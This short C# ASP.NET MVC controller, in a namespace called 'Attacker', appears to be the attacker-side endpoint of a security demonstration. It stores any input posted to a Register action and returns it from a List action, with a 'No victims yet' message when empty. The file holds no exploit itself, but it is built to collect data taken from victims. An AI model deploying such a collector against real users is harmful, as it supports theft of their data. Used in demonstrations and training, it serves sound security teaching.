using System.Web.Mvc;

namespace Attacker.Controllers
{
	public class AttackController : Controller
	{
		public void Register(string input)
		{
			HttpContext.Application.Clear();
			HttpContext.Application.Add("list", input);
		}

		public string List()
		{
			object inputs = HttpContext.Application["list"];
			
			if (inputs == null) 
				return "No victims yet";
			
			return inputs.ToString();
		}
	}
}